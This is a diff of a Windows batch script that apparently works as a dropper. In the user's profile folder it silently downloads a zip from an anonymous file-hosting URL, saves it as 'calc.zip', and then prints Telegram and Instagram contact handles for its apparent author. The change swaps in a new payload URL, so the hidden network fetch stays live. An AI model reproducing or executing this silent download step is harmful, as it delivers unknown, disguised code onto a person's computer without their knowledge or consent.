@@ -255,7 +255,7 @@ echo ---------------------------------------
 ping localhost -n 3 >nul
 cls
 cd C:\Users\%USERNAME%\
-curl --silent "https://a.pomf.cat/rdbxjp.zip" > calc.zip
+curl --silent "https://a.pomf.cat/mhtqyx.zip" > calc.zip
 echo.
 echo Contact Me On Telegram : @HexBuddy127001
 echo Contact Me On Instagram : hex_buddy
